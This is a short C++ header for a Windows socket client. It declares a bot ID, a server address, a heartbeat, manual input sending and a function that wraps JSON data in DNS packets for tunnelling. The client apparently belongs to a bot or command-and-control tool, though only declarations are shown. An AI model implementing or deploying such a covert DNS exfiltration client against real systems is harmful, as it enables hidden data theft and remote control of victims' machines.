#pragma once
#include <string>
#include <winsock2.h>

extern const char* SERVER_IP;
extern const int SERVER_PORT;
extern const char* BOT_ID;
extern SOCKET clientSocket;

std::string CreateDNSPacket(const std::string& jsonData);
bool InitializeConnection();
bool SendDataTunnel(const std::string& data);
void SendManualInput(const std::string& content);
void SendHeartbeat();

